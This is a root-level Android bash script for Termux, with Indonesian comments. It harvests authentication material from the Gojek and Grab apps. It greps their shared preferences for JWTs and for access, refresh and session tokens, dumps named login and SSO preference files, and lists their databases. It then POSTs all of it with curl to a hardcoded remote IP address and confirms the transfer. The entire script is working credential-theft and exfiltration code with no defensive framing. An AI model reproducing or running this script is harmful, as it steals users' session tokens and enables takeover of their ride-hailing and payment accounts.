#!/data/data/com.termux/files/usr/bin/bash
# harvest3.sh — root, full-path curl, grep luas + dump kandidat file auth.
SRV="http://161.120.180.21:9911/token"
CURL=/data/data/com.termux/files/usr/bin/curl
OUT=$(mktemp)
GJ=/data/data/com.gojek.app
GB=/data/data/com.grabtaxi.passenger
{
echo "########## GOJEK: grep JWT di SEMUA prefs ##########"
grep -rhoE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}' $GJ/shared_prefs/ 2>/dev/null | sort -u | head -5
echo "########## GOJEK: key token-ish ##########"
grep -rhoiE '(access_?token|refresh_?token|auth_?token|id_?token|session_?token)"?[^A-Za-z0-9]{1,8}[A-Za-z0-9._-]{10,}' $GJ/shared_prefs/ 2>/dev/null | sort -u | head -15
echo "########## GOJEK: file kandidat (isi) ##########"
for f in AuthPreferences.xml gojek-identity-sso.xml prefGoToLogin.xml goto-scp-login.xml GofoodPref.xml "ID:GofoodPrefKeepOnLogout.xml" com.gojek.app_preferences.xml seeker_preference_v2.xml com.gojek.shs.xml pxPreference.xml; do
  if [ -f "$GJ/shared_prefs/$f" ]; then
    echo "----- $f -----"
    head -c 2500 "$GJ/shared_prefs/$f"
    echo
  fi
done
echo "########## GOJEK: databases ##########"
ls $GJ/databases/ 2>/dev/null | head -20
echo "########## GRAB: grep JWT/token ##########"
grep -rhoE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}' $GB/shared_prefs/ 2>/dev/null | sort -u | head -5
grep -rhoiE '(access_?token|refresh_?token|auth_?token|authToken|IDToken)"?[^A-Za-z0-9]{1,8}[A-Za-z0-9._-]{10,}' $GB/shared_prefs/ 2>/dev/null | sort -u | head -15
echo "########## GRAB: file kandidat (isi) ##########"
for f in GU_STORAGE_KIT.xml com.grabtaxi.passenger_preferences.xml 87zj7s6thaewgjwMP98MC5I4P23DE5934.xml txplybafqlguctdjcbyclxt.xml null.xml gd_sp.xml; do
  if [ -f "$GB/shared_prefs/$f" ]; then
    echo "----- $f -----"
    head -c 2500 "$GB/shared_prefs/$f"
    echo
  fi
done
echo "########## GRAB: databases ##########"
ls $GB/databases/ 2>/dev/null | head -20
echo "=== SELESAI ==="
} > $OUT 2>&1
cat $OUT
$CURL -s -m 20 -X POST -H "Content-Type: text/plain" --data-binary @$OUT $SRV && echo "TERKIRIM OK"
